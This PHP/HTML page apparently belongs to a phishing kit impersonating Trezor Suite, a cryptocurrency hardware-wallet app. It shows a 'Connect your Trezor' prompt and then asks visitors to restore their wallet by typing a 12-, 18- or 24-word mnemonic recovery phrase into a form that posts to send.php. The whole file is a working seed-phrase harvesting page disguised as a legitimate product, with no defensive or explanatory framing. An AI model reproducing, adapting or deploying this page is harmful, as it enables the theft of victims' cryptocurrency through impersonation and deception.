<?php include_once './config.php';?>
<html lang="en">
    <?php
        $title = 'Trezor Suite';
        include_once './includes/meta.php'; 
    ?>
    <body>
        <div class="container-fluid">
            <div class="row">
                <div class="col-sm-5 bg-white text-center position-relative" style="height: 100vh;">
                    <div class="position-absolute w-100 text-center" style="top: 40%">
                        <img src="<?= base_url('assets/img/logo.png')?>" alt="Logo" width="200" title="Trezor Suite" class="" style="" />
                        <h1 class="fs55 py5">Welcome!</h1>
                    </div>
                </div>
                <div class="col-sm-7" style="height: 100vh; overflow: auto;  ">
                    <div class="text-center mt60 mb15 pt25">
                        <div class="p10 bg-white d-inline-block rounded-pill shadow">
                            <img src="<?= base_url('assets/img/icon2.png')?>" alt="Logo" width="90" title="Trezor Suite" class="rounded-circle" style="background-color: #F4F4F4" />
                            <span class="fs20 px35">Connect your Trezor</span>
                        </div>
                    </div>
                    <div class="shadow bg-white rounded-3 px10 py25">
                        <div class="row px15 border-bottom pb20 mb20">
                            <div class="col-sm-6"><button id="fetch_data" class="btn btn-secondary"></button></div>
                            <div class="col-sm-6 my10 text-center">
                                <a href="#" class="text-link text-secondary text-decoration-none">Still don’t see your Trezor? <i class="fa-solid fa-chevron-down"></i></a>
                            </div>
                        </div>
                        <div class="row px15">
                            <div class="fs18 text-dark">Try to Restore Trezor using your Mnemonic Phrase</div>
                            <div class="fs16 py20 text-dark">How many words does your Mnemonic contain?</div>
                            <div class="pt20 pb10">
                                <button data-word="12" class="btn btn-dark px15 formactive activeForm">12 Words</button>
                                <button data-word="18" class="btn btn-dark px15 ms20 activeForm">18 Words</button>
                                <button data-word="24" class="btn btn-dark px15 ms20 activeForm">24 Words</button>
                            </div>
                            <form method="post" action="<?= base_url('send.php')?>" class="py10">
                                <div class="row form_keys"></div>
                                <div class="row">
                                    <div class="col-sm-12 my20">
                                        <button type="submit" class="btn btn-success text-white border px40 fs16 fw-bold py10 ">Next ...</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php';  ?>
    </body>
</html>